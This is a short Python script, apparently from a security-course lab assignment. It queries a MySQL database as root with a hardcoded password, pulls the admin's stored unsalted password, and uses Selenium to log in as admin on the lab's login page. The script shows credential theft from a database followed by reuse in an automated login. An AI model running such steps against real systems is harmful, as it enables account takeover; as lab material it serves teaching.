import MySQLdb

from selenium import webdriver
from selenium.webdriver.common.desired_capabilities import DesiredCapabilities
from selenium.webdriver.common.keys import Keys

db = MySQLdb.connect(host="localhost", user="root", passwd="student", db="cs5331")        
cur = db.cursor()

print "retrieving unsalted password from database..."
cur.execute("SELECT email, password FROM table20 WHERE username='admin'")
row = cur.fetchall()[0]
a = row[0]
b = row[1]
db.close()

location = "./geckodriver"
firefox_capabilities = DesiredCapabilities.FIREFOX
firefox_capabilities["marionette"] = True
firefox_capabilities["binary"] = "/usr/bin/firefox"
print 'retrieved email:', a, 'password:', b

print "logging you in..."
driver = webdriver.Firefox(capabilities=firefox_capabilities,executable_path='./geckodriver')

driver.get('http://wsb.com/Assignment2/case20/login.php')
email = driver.find_element_by_name("email")
password = driver.find_element_by_name("password")
email.send_keys(a);
password.send_keys(b)
driver.find_element_by_xpath("/html/body/form/input[3]").click()



